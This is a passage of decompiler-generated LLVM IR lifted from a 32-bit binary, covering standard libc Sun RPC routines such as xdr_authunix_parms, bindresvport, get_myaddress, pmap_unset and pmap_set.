  %v3_100273e0 = load i32, i32* %v2_100273e0, align 4
  %v3_100273e4 = icmp eq i32 %v3_100273e0, 0
  br i1 %v3_100273e4, label %dec_label_pc_100273f4, label %dec_label_pc_100273ec

dec_label_pc_100273ec:                            ; preds = %dec_label_pc_10027378
  call void @__pseudo_call(i32 %v3_100273e0)
  br label %dec_label_pc_100273f4

dec_label_pc_100273f4:                            ; preds = %dec_label_pc_1002735c, %dec_label_pc_10027378, %dec_label_pc_100273ec
  %v0_100273f4 = load i32, i32* @r31, align 4
  br label %dec_label_pc_100273f8

dec_label_pc_100273f8:                            ; preds = %dec_label_pc_10027348, %dec_label_pc_100273f4
  %v0_10027408 = phi i32 [ 0, %dec_label_pc_10027348 ], [ %v0_100273f4, %dec_label_pc_100273f4 ]
  ret i32 %v0_10027408

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 ()* @xdr_opaque_auth, { 1, 0, 2, 3 }
  uselistorder i32 (i32*, i32, i32, i32)* @__GI_xdrmem_create, { 2, 1, 0, 3 }
  uselistorder i32 (i32, i32)* @calloc, { 1, 3, 0, 2 }
  uselistorder i32 64, { 14, 0, 1, 2, 3, 4, 5, 6, 7, 36, 40, 41, 8, 42, 11, 12, 13, 37, 38, 47, 39, 19, 54, 35, 20, 43, 21, 22, 23, 24, 25, 26, 27, 17, 49, 50, 52, 51, 44, 45, 28, 29, 46, 30, 53, 31, 32, 33, 34, 48, 18, 10, 9, 15, 16 }
  uselistorder i32 152, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_100273f8, { 1, 0 }
  uselistorder label %dec_label_pc_100273f4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1002735c, { 1, 0 }
}

define i32 @__GI_xdr_authunix_parms(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r4, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  store i32 %arg2, i32* @r31, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 268596264, i32* @lr, align 4
  %v0_10027424 = call i32 @xdr_u_long()
  store i32 255, i32* @r5, align 4
  %v3_1002742c = icmp eq i32 %v0_10027424, 0
  %v0_10027430 = load i32, i32* @r31, align 4
  %v1_10027430 = add i32 %v0_10027430, 4
  store i32 %v1_10027430, i32* @r4, align 4
  br i1 %v3_1002742c, label %dec_label_pc_100274a4, label %dec_label_pc_1002743c

dec_label_pc_1002743c:                            ; preds = %entry
  %v0_10027434 = load i32, i32* @r30, align 4
  store i32 268596288, i32* @lr, align 4
  %v3_1002743c = inttoptr i32 %v0_10027434 to i32*
  %v4_1002743c = call i32 @__GI_xdr_string(i32* %v3_1002743c)
  %v0_10027440 = load i32, i32* @r31, align 4
  %v1_10027440 = add i32 %v0_10027440, 8
  store i32 %v1_10027440, i32* @r4, align 4
  %v3_10027444 = icmp eq i32 %v4_1002743c, 0
  %v0_10027448 = load i32, i32* @r30, align 4
  store i32 %v0_10027448, i32* @r3, align 4
  br i1 %v3_10027444, label %dec_label_pc_100274a4, label %dec_label_pc_10027450

dec_label_pc_10027450:                            ; preds = %dec_label_pc_1002743c
  store i32 268596308, i32* @lr, align 4
  %v2_10027450 = inttoptr i32 %v0_10027448 to i32*
  %v3_10027450 = inttoptr i32 %v1_10027440 to i32*
  %v4_10027450 = call i32 @xdr_u_int(i32* %v2_10027450, i32* %v3_10027450)
  %v0_10027454 = load i32, i32* @r31, align 4
  %v1_10027454 = add i32 %v0_10027454, 12
  store i32 %v1_10027454, i32* @r4, align 4
  %v3_10027458 = icmp eq i32 %v4_10027450, 0
  %v0_1002745c = load i32, i32* @r30, align 4
  store i32 %v0_1002745c, i32* @r3, align 4
  br i1 %v3_10027458, label %dec_label_pc_100274a4, label %dec_label_pc_10027464

dec_label_pc_10027464:                            ; preds = %dec_label_pc_10027450
  store i32 ptrtoint (i32* @global_var_10027468.1398 to i32), i32* @lr, align 4
  %v2_10027464 = inttoptr i32 %v0_1002745c to i32*
  %v3_10027464 = inttoptr i32 %v1_10027454 to i32*
  %v4_10027464 = call i32 @xdr_u_int(i32* %v2_10027464, i32* %v3_10027464)
  %v3_1002746c = icmp eq i32 %v4_10027464, 0
  %v0_10027470 = load i32, i32* @r31, align 4
  %v0_10027474 = load i32, i32* @r30, align 4
  store i32 268583320, i32* @r8, align 4
  br i1 %v3_1002746c, label %dec_label_pc_100274a4, label %dec_label_pc_1002748c

dec_label_pc_1002748c:                            ; preds = %dec_label_pc_10027464
  %v1_1002747c = add i32 %v0_10027470, 20
  %v1_10027470 = add i32 %v0_10027470, 16
  store i32 268596368, i32* @lr, align 4
  %v6_1002748c = inttoptr i32 %v0_10027474 to i32*
  %v7_1002748c = call i32 @__GI_xdr_array(i32* %v6_1002748c, i32 %v1_1002747c, i32 %v1_10027470, i32 16, i32 4, i32 268583320)
  %v2_10027490 = icmp ne i32 %v7_1002748c, 0
  %v5_10027494 = zext i1 %v2_10027490 to i32
  br label %dec_label_pc_100274a4

dec_label_pc_100274a4:                            ; preds = %entry, %dec_label_pc_1002743c, %dec_label_pc_10027450, %dec_label_pc_10027464, %dec_label_pc_1002748c
  %storemerge = phi i32 [ %v5_10027494, %dec_label_pc_1002748c ], [ 0, %dec_label_pc_10027464 ], [ 0, %dec_label_pc_10027450 ], [ 0, %dec_label_pc_1002743c ], [ 0, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_10027470, { 1, 0 }
  uselistorder i32 268583320, { 1, 0 }
  uselistorder i32 (i32*)* @__GI_xdr_string, { 1, 0 }
  uselistorder i32 255, { 44, 45, 46, 6, 48, 47, 49, 54, 52, 53, 0, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 50, 40, 41, 51, 42, 43 }
  uselistorder i32 ()* @xdr_u_long, { 9, 11, 14, 8, 7, 13, 6, 10, 2, 1, 0, 12, 5, 4, 3 }
  uselistorder label %dec_label_pc_100274a4, { 4, 3, 2, 1, 0 }
}

define i32 @__GI_bindresvport(i32 %arg1, i16* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg2 to i32
  store i32 %tmp, i32* @r4, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_100274bc = load i32, i32* @lr, align 4
  store i32 %v0_100274bc, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* %r29.global-to-local, align 4
  %v4_100274c4 = icmp eq i16* %arg2, null
  store i32 %arg1, i32* %r28.global-to-local, align 4
  br i1 %v4_100274c4, label %dec_label_pc_100274d4, label %dec_label_pc_100274f0

dec_label_pc_100274d4:                            ; preds = %entry
  %v2_100274d4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_100274d4, i32* %r29.global-to-local, align 4
  store i32 16, i32* @r5, align 4
  store i32 %v2_100274d4, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_100274e4.1399 to i32), i32* @lr, align 4
  %v0_100274e0 = call i32 @__GI_memset()
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-40, align 4
  br label %dec_label_pc_10027510

dec_label_pc_100274f0:                            ; preds = %entry
  %v2_100274f0 = load i16, i16* %arg2, align 2
  %v3_100274f0 = zext i16 %v2_100274f0 to i32
  store i32 %v3_100274f0, i32* %r0.global-to-local, align 4
  %v3_100274f4 = icmp eq i16 %v2_100274f0, 2
  br i1 %v3_100274f4, label %dec_label_pc_10027510, label %dec_label_pc_100274fc

dec_label_pc_100274fc:                            ; preds = %dec_label_pc_100274f0
  %v0_100274fc = call i32 @__errno_location()
  store i32 96, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_10027508 = inttoptr i32 %v0_100274fc to i32*
  store i32 96, i32* %v2_10027508, align 4
  %v0_100275b8.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100275b4

dec_label_pc_10027510:                            ; preds = %dec_label_pc_100274f0, %dec_label_pc_100274d4
  %v3_10027514 = load i16, i16* @global_var_100452b0.1401, align 2
  %v4_10027514 = sext i16 %v3_10027514 to i32
  store i32 %v4_10027514, i32* %r0.global-to-local, align 4
  %v3_10027518 = icmp eq i16 %v3_10027514, 0
  br i1 %v3_10027518, label %dec_label_pc_10027520, label %dec_label_pc_1002753c

dec_label_pc_10027520:                            ; preds = %dec_label_pc_10027510
  store i32 ptrtoint (i32* @global_var_10027524.1402 to i32), i32* @lr, align 4
  %v0_10027520 = call i32 @__libc_getpid()
  %v2_10027528 = srem i32 %v0_10027520, 424
  %v1_1002752c = sub i32 %v0_10027520, %v2_10027528
  store i32 %v1_1002752c, i32* %r0.global-to-local, align 4
  %v1_10027534 = add nsw i32 %v2_10027528, 600
  %v1_10027538 = trunc i32 %v1_10027534 to i16
  store i16 %v1_10027538, i16* @global_var_100452b0.1401, align 2
  br label %dec_label_pc_1002753c

dec_label_pc_1002753c:                            ; preds = %dec_label_pc_10027510, %dec_label_pc_10027520
  %v0_1002753c = call i32 @__errno_location()
  store i32 0, i32* @r31, align 4
  store i32 98, i32* %r0.global-to-local, align 4
  store i32 %v0_1002753c, i32* @r30, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_10027550 = inttoptr i32 %v0_1002753c to i32*
  store i32 98, i32* %v2_10027550, align 4
  %v0_1002758c.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10027584

dec_label_pc_10027558:                            ; preds = %dec_label_pc_100275a8
  %v3_10027558 = load i16, i16* @global_var_100452b0.1401, align 2
  %v4_10027558 = sext i16 %v3_10027558 to i32
  store i32 %v4_10027558, i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100452b1.1403 to i32), i32* %r0.global-to-local, align 4
  %v3_10027560 = add i32 %v0_10027594, 2
  %v4_10027560 = inttoptr i32 %v3_10027560 to i16*
  store i16 %v3_10027558, i16* %v4_10027560, align 2
  %v0_10027564 = load i32, i32* %r0.global-to-local, align 4
  %v1_10027564 = mul i32 %v0_10027564, 65536
  %v2_10027564 = sdiv i32 %v1_10027564, 65536
  store i32 %v2_10027564, i32* %r0.global-to-local, align 4
  %v1_1002756c = trunc i32 %v2_10027564 to i16
  store i16 %v1_1002756c, i16* @global_var_100452b0.1401, align 2
  %tmp8 = icmp slt i32 %v1_10027564, 67043329
  br i1 %tmp8, label %dec_label_pc_1002757c, label %dec_label_pc_10027574

dec_label_pc_10027574:                            ; preds = %dec_label_pc_10027558
  store i32 600, i32* %r0.global-to-local, align 4
  store i16 600, i16* @global_var_100452b0.1401, align 2
  br label %dec_label_pc_1002757c

dec_label_pc_1002757c:                            ; preds = %dec_label_pc_10027558, %dec_label_pc_10027574
  store i32 268596608, i32* @lr, align 4
  %v0_1002757c = call i32 @bind()
  store i32 %v0_1002757c, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10027584

dec_label_pc_10027584:                            ; preds = %dec_label_pc_1002753c, %dec_label_pc_1002757c
  %v0_1002758c = phi i32 [ %v0_1002758c.pre, %dec_label_pc_1002753c ], [ %v0_1002757c, %dec_label_pc_1002757c ]
  %v0_10027584 = load i32, i32* @r31, align 4
  %v2_10027584 = icmp sgt i32 %v0_10027584, 423
  %v0_10027590 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10027590, i32* @r3, align 4
  %v0_10027594 = load i32, i32* %r29.global-to-local, align 4
  %v1_1002759c = add i32 %v0_10027584, 1
  store i32 %v1_1002759c, i32* @r31, align 4
  %tmp7 = icmp sgt i32 %v0_1002758c, -1
  %or.cond = or i1 %tmp7, %v2_10027584
  br i1 %or.cond, label %dec_label_pc_100275b4, label %dec_label_pc_100275a8

dec_label_pc_100275a8:                            ; preds = %dec_label_pc_10027584
  %v0_100275a8 = load i32, i32* @r30, align 4
  %v1_100275a8 = inttoptr i32 %v0_100275a8 to i32*
  %v2_100275a8 = load i32, i32* %v1_100275a8, align 4
  store i32 %v2_100275a8, i32* %r0.global-to-local, align 4
  %v3_100275ac = icmp eq i32 %v2_100275a8, 98
  br i1 %v3_100275ac, label %dec_label_pc_10027558, label %dec_label_pc_100275b4

dec_label_pc_100275b4:                            ; preds = %dec_label_pc_100275a8, %dec_label_pc_10027584, %dec_label_pc_100274fc
  %v0_100275b8 = phi i32 [ %v0_100275b8.pre, %dec_label_pc_100274fc ], [ %v0_1002758c, %dec_label_pc_10027584 ], [ %v0_1002758c, %dec_label_pc_100275a8 ]
  store i32 %v0_100274bc, i32* %r0.global-to-local, align 4
  ret i32 %v0_100275b8

; uselistorder directives
  uselistorder i32 %v2_10027564, { 1, 0 }
  uselistorder i32* %r29.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 0, 5, 1, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 98, { 2, 1, 3, 0 }
  uselistorder i32 ()* @__libc_getpid, { 0, 11, 10, 3, 1, 9, 8, 7, 6, 5, 4, 2 }
  uselistorder i16* @global_var_100452b0.1401, { 4, 3, 2, 1, 0 }
  uselistorder i32 96, { 0, 4, 2, 3, 5, 6, 7, 8, 9, 10, 11, 1 }
  uselistorder label %dec_label_pc_10027584, { 1, 0 }
  uselistorder label %dec_label_pc_1002757c, { 1, 0 }
  uselistorder label %dec_label_pc_1002753c, { 1, 0 }
}

define i32 @__get_myaddress(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i16 @__decompiler_undefined_function_2()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4160 = alloca i32, align 4
  %stack_var_-4168 = alloca i32, align 4
  %stack_var_-4128 = alloca i32, align 4
  store i32 %arg1, i32* @r27, align 4
  store i32 268596720, i32* @lr, align 4
  %v3_100275ec = call i32 @socket(i32 2, i32 2, i32 0)
  store i32 %v3_100275ec, i32* @r3, align 4
  store i32 %v3_100275ec, i32* @r29, align 4
  %tmp13 = icmp sgt i32 %v3_100275ec, -1
  br i1 %tmp13, label %dec_label_pc_10027604, label %dec_label_pc_100275f8

dec_label_pc_100275f8:                            ; preds = %entry
  store i32 ptrtoint ([24 x i8]* @global_var_1002fb9c.1404 to i32), i32* @r3, align 4
  br label %dec_label_pc_1002763c

dec_label_pc_10027604:                            ; preds = %entry
  store i32 4096, i32* %stack_var_-4168, align 4
  store i32 35090, i32* @r4, align 4
  %v2_10027614 = ptrtoint i32* %stack_var_-4128 to i32
  %v2_10027618 = ptrtoint i32* %stack_var_-4168 to i32
  store i32 %v2_10027618, i32* @r5, align 4
  store i32 268596776, i32* @lr, align 4
  %v0_10027624 = call i32 @ioctl()
  store i32 1, i32* @r28, align 4
  %tmp14 = icmp sgt i32 %v0_10027624, -1
  br i1 %tmp14, label %dec_label_pc_10027648.preheader, label %dec_label_pc_10027634

dec_label_pc_10027634:                            ; preds = %dec_label_pc_10027604
  store i32 ptrtoint ([53 x i8]* @global_var_1002fbb4.1405 to i32), i32* @r3, align 4
  br label %dec_label_pc_1002763c

dec_label_pc_1002763c:                            ; preds = %dec_label_pc_10027680, %dec_label_pc_100275f8, %dec_label_pc_10027634
  %stack_var_-4164.0 = phi i32 [ %stack_var_-4164.1.ph, %dec_label_pc_10027680 ], [ %v2_10027614, %dec_label_pc_10027634 ], [ %tmp6, %dec_label_pc_100275f8 ]
  store i32 ptrtoint ([3 x i8]* @global_var_10027640.1406 to i32), i32* @lr, align 4
  %v0_1002763c = call i32 @perror()
  %v0_10027644 = call i32 @__GI_exit()
  br label %dec_label_pc_10027648.preheader

dec_label_pc_10027648.preheader:                  ; preds = %dec_label_pc_1002763c, %dec_label_pc_10027604
  %stack_var_-4164.1.ph = phi i32 [ %stack_var_-4164.0, %dec_label_pc_1002763c ], [ %v2_10027614, %dec_label_pc_10027604 ]
  %v2_10027654 = ptrtoint i32* %stack_var_-4160 to i32
  %tmp16 = urem i16 %tmp, 2
  %v3_10027690 = icmp eq i16 %tmp16, 0
  %v1_100276a4 = and i16 %tmp, 8
  %v3_100276a4 = icmp eq i16 %v1_100276a4, 0
  br label %dec_label_pc_10027648

dec_label_pc_10027648:                            ; preds = %dec_label_pc_10027648.preheader, %dec_label_pc_100276f0
  store i32 %stack_var_-4164.1.ph, i32* @r31, align 4
  %v3_1002764c = load i32, i32* %stack_var_-4168, align 4
  store i32 %v3_1002764c, i32* @r30, align 4
  %v3_100276e04 = icmp eq i32 %v3_1002764c, 0
  br i1 %v3_100276e04, label %dec_label_pc_100276e8, label %dec_label_pc_10027654

dec_label_pc_10027654:                            ; preds = %dec_label_pc_10027648, %dec_label_pc_100276d8
  store i32 35091, i32* @r4, align 4
  store i32 %v2_10027654, i32* @r5, align 4
  %v0_1002766c = load i32, i32* @r29, align 4
  store i32 %v0_1002766c, i32* @r3, align 4
  store i32 268596856, i32* @lr, align 4
  %v0_10027674 = call i32 @ioctl()
  %tmp15 = icmp sgt i32 %v0_10027674, -1
  br i1 %tmp15, label %dec_label_pc_1002768c, label %dec_label_pc_10027680

dec_label_pc_10027680:                            ; preds = %dec_label_pc_10027654
  store i32 ptrtoint ([23 x i8]* @global_var_1002fbec.1407 to i32), i32* @r3, align 4
  br label %dec_label_pc_1002763c

dec_label_pc_1002768c:                            ; preds = %dec_label_pc_10027654
  %v0_100276d8.pre = load i32, i32* @r31, align 4
  br i1 %v3_10027690, label %dec_label_pc_100276d8, label %dec_label_pc_10027698

dec_label_pc_10027698:                            ; preds = %dec_label_pc_1002768c
  %v1_10027698 = add i32 %v0_100276d8.pre, 16
  %v2_10027698 = inttoptr i32 %v1_10027698 to i16*
  %v3_10027698 = load i16, i16* %v2_10027698, align 2
  %v3_1002769c = icmp eq i16 %v3_10027698, 2
  br i1 %v3_1002769c, label %dec_label_pc_100276a4, label %dec_label_pc_100276d8

dec_label_pc_100276a4:                            ; preds = %dec_label_pc_10027698
  br i1 %v3_100276a4, label %dec_label_pc_100276ac, label %dec_label_pc_100276b4

dec_label_pc_100276ac:                            ; preds = %dec_label_pc_100276a4
  %v0_100276ac = load i32, i32* @r28, align 4
  %v3_100276ac = icmp eq i32 %v0_100276ac, 0
  br i1 %v3_100276ac, label %dec_label_pc_100276b4, label %dec_label_pc_100276d8

dec_label_pc_100276b4:                            ; preds = %dec_label_pc_100276ac, %dec_label_pc_100276a4
  %v0_100276c4 = load i32, i32* @r29, align 4
  %v2_100276c8 = load i32, i32* @r27, align 4
  %v3_100276c8 = add i32 %v2_100276c8, 2
  %v4_100276c8 = inttoptr i32 %v3_100276c8 to i16*
  store i16 111, i16* %v4_100276c8, align 2
  store i32 ptrtoint ([3 x i8]* @global_var_100276d0.1408 to i32), i32* @lr, align 4
  %v1_100276cc = call i32 @__libc_close(i32 %v0_100276c4)
  br label %dec_label_pc_10027704

dec_label_pc_100276d8:                            ; preds = %dec_label_pc_1002768c, %dec_label_pc_100276ac, %dec_label_pc_10027698
  %v1_100276d8 = add i32 %v0_100276d8.pre, 32
  store i32 %v1_100276d8, i32* @r31, align 4
  %v0_100276dc = load i32, i32* @r30, align 4
  %v1_100276dc = add i32 %v0_100276dc, -32
  store i32 %v1_100276dc, i32* @r30, align 4
  %v3_100276e0 = icmp eq i32 %v1_100276dc, 0
  br i1 %v3_100276e0, label %dec_label_pc_100276e8, label %dec_label_pc_10027654

dec_label_pc_100276e8:                            ; preds = %dec_label_pc_100276d8, %dec_label_pc_10027648
  %v0_100276e8 = load i32, i32* @r28, align 4
  %v3_100276e8 = icmp eq i32 %v0_100276e8, 1
  br i1 %v3_100276e8, label %dec_label_pc_100276f0, label %dec_label_pc_100276f8

dec_label_pc_100276f0:                            ; preds = %dec_label_pc_100276e8
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_10027648

dec_label_pc_100276f8:                            ; preds = %dec_label_pc_100276e8
  %v0_100276f8 = load i32, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10027700.1409 to i32), i32* @lr, align 4
  %v1_100276fc = call i32 @__libc_close(i32 %v0_100276f8)
  br label %dec_label_pc_10027704

dec_label_pc_10027704:                            ; preds = %dec_label_pc_100276b4, %dec_label_pc_100276f8
  %storemerge1 = phi i32 [ 0, %dec_label_pc_100276f8 ], [ 1, %dec_label_pc_100276b4 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v1_100276dc, { 1, 0 }
  uselistorder i32* %stack_var_-4168, { 0, 2, 1 }
  uselistorder i32 (i32)* @__libc_close, { 1, 0, 8, 7, 6, 26, 25, 24, 23, 22, 21, 20, 19, 27, 18, 9, 17, 16, 15, 14, 13, 12, 5, 11, 10, 3, 2, 4 }
  uselistorder i32 35091, { 1, 2, 0 }
  uselistorder i16 8, { 0, 6, 1, 2, 3, 4, 5 }
  uselistorder i16 2, { 15, 0, 16, 1, 14, 17, 2, 3, 18, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 ()* @__GI_exit, { 7, 0, 1, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 6, 5, 4, 3, 2, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 8, 17, 16, 15, 14, 13, 12, 11, 10, 9 }
  uselistorder i32 ()* @perror, { 0, 2, 1 }
  uselistorder i32 ()* @ioctl, { 5, 4, 11, 10, 9, 8, 13, 12, 3, 0, 2, 1, 14, 7, 6 }
  uselistorder i32 35090, { 1, 0, 2 }
  uselistorder i32 4096, { 3, 4, 1, 24, 2, 5, 28, 29, 6, 7, 8, 25, 9, 10, 26, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 27, 0, 21, 22, 23 }
  uselistorder i32 (i32, i32, i32)* @socket, { 1, 39, 37, 5, 0, 15, 36, 35, 34, 38, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 14, 13, 12, 2, 11, 10, 9, 8, 7, 6, 4, 3 }
  uselistorder label %dec_label_pc_10027704, { 1, 0 }
  uselistorder label %dec_label_pc_100276d8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10027654, { 1, 0 }
  uselistorder label %dec_label_pc_10027648, { 1, 0 }
  uselistorder label %dec_label_pc_1002763c, { 0, 2, 1 }
}

define i32 @__GI_pmap_unset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v2_10027724 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_10027724, i32* %r29.global-to-local, align 4
  store i32 -1, i32* %stack_var_-72, align 4
  store i32 268597060, i32* @lr, align 4
  %v1_10027740 = call i32 @__get_myaddress(i32 %v2_10027724)
  %v2_10027744 = ptrtoint i32* %stack_var_-24 to i32
  %v3_10027748 = icmp eq i32 %v1_10027740, 0
  store i32 %v2_10027744, i32* @r6, align 4
  %v2_10027758 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_10027758, i32* @r7, align 4
  store i32 400, i32* @r8, align 4
  store i32 400, i32* @r9, align 4
  br i1 %v3_10027748, label %dec_label_pc_10027810, label %dec_label_pc_10027770

dec_label_pc_10027770:                            ; preds = %entry
  store i32 5, i32* %stack_var_-24, align 4
  store i32 268597132, i32* @lr, align 4
  %v9_10027788 = call i32 @__GI_clntudp_bufcreate(i32 %v2_10027724, i32 100000, i32 2)
  store i32 %v9_10027788, i32* %r29.global-to-local, align 4
  %v3_1002778c = icmp eq i32 %v9_10027788, 0
  %v2_100277b0 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_100277b0, i32* @r8, align 4
  br i1 %v3_1002778c, label %dec_label_pc_10027810, label %dec_label_pc_100277b8

dec_label_pc_100277b8:                            ; preds = %dec_label_pc_10027770
  store i32 60, i32* %stack_var_-24, align 4
  %v1_100277e0 = add i32 %v9_10027788, 4
  %v2_100277e0 = inttoptr i32 %v1_100277e0 to i32*
  %v3_100277e0 = load i32, i32* %v2_100277e0, align 4
  %v1_100277e4 = inttoptr i32 %v3_100277e0 to i32*
  %v2_100277e4 = load i32, i32* %v1_100277e4, align 4
  call void @__pseudo_call(i32 %v2_100277e4)
  %v0_100277f0 = load i32, i32* %r29.global-to-local, align 4
  %v1_100277f0 = add i32 %v0_100277f0, 4
  %v2_100277f0 = inttoptr i32 %v1_100277f0 to i32*
  %v3_100277f0 = load i32, i32* %v2_100277f0, align 4
  %v1_100277f8 = add i32 %v3_100277f0, 16
  %v2_100277f8 = inttoptr i32 %v1_100277f8 to i32*
  %v3_100277f8 = load i32, i32* %v2_100277f8, align 4
  call void @__pseudo_call(i32 %v3_100277f8)
  %v3_10027804 = load i32, i32* %stack_var_-68, align 4
  br label %dec_label_pc_10027810

dec_label_pc_10027810:                            ; preds = %entry, %dec_label_pc_10027770, %dec_label_pc_100277b8
  %storemerge = phi i32 [ %v3_10027804, %dec_label_pc_100277b8 ], [ 0, %dec_label_pc_10027770 ], [ 0, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder label %dec_label_pc_10027810, { 2, 1, 0 }
}

define i32 @pmap_set(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %v2_10027830 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_10027830, i32* %r29.global-to-local, align 4
  store i32 -1, i32* %stack_var_-88, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10027858.1414 to i32), i32* @lr, align 4
  %v1_10027854 = call i32 @__get_myaddress(i32 %v2_10027830)
  %v2_10027858 = ptrtoint i32* %stack_var_-40 to i32
  %v3_1002785c = icmp eq i32 %v1_10027854, 0
  store i32 %v2_10027858, i32* @r6, align 4
  %v2_1002786c = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v2_1002786c, i32* @r7, align 4
  store i32 400, i32* @r8, align 4
  store i32 400, i32* @r9, align 4
  br i1 %v3_1002785c, label %dec_label_pc_10027940, label %dec_label_pc_10027884

dec_label_pc_10027884:                            ; preds = %entry
  store i32 5, i32* %stack_var_-40, align 4
  store i32 268597408, i32* @lr, align 4
  %v9_1002789c = call i32 @__GI_clntudp_bufcreate(i32 %v2_10027830, i32 100000, i32 2)
  store i32 %v9_1002789c, i32* %r29.global-to-local, align 4
  %v3_100278a0 = icmp eq i32 %v9_1002789c, 0
  %v2_100278c0 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_100278c0, i32* @r8, align 4
  br i1 %v3_100278a0, label %dec_label_pc_10027940, label %dec_label_pc_10027920

dec_label_pc_10027920:                            ; preds = %dec_label_pc_10027884
  store i32 60, i32* %stack_var_-40, align 4
  %v1_100278f0 = add i32 %v9_1002789c, 4
  %v2_100278f0 = inttoptr i32 %v1_100278f0 to i32*
  %v3_100278f0 = load i32, i32* %v2_100278f0, align 4
  %v1_100278f4 = inttoptr i32 %v3_100278f0 to i32*
  %v2_100278f4 = load i32, i32* %v1_100278f4, align 4
  call void @__pseudo_call(i32 %v2_100278f4)
  store i32 ptrtoint ([24 x i8]* @global_var_1002fc04.1415 to i32), i32* @r4, align 4
  %v0_1002790c = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_1002790c, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10027918.1416 to i32), i32* @lr, align 4
  %v3_10027914 = call i32 @clnt_perror(i32 %v0_1002790c, i32 ptrtoint ([24 x i8]* @global_var_1002fc04.1415 to i32))
  store i32 0, i32* %stack_var_-84, align 4
  %v0_10027920.pre = load i32, i32* @r29, align 4
  %v1_10027920 = add i32 %v0_10027920.pre, 4
  %v2_10027920 = inttoptr i32 %v1_10027920 to i32*
  %v3_10027920 = load i32, i32* %v2_10027920, align 4
  %v1_10027928 = add i32 %v3_10027920, 16
  %v2_10027928 = inttoptr i32 %v1_10027928 to i32*
  %v3_10027928 = load i32, i32* %v2_10027928, align 4
  call void @__pseudo_call(i32 %v3_10027928)
  %v3_10027934 = load i32, i32* %stack_var_-84, align 4
  br label %dec_label_pc_10027940

dec_label_pc_10027940:                            ; preds = %entry, %dec_label_pc_10027884, %dec_label_pc_10027920
  %storemerge = phi i32 [ %v3_10027934, %dec_label_pc_10027920 ], [ 0, %dec_label_pc_10027884 ], [ 0, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-88, { 1, 0 }
  uselistorder i32 60, { 12, 13, 24, 25, 14, 1, 16, 26, 19, 17, 18, 28, 29, 27, 32, 33, 31, 30, 4, 5, 20, 2, 6, 8, 7, 9, 11, 10, 21, 3, 22, 23, 0, 15 }
  uselistorder i32 (i32, i32, i32)* @__GI_clntudp_bufcreate, { 3, 1, 0, 2 }
  uselistorder i32 100000, { 1, 2, 0 }
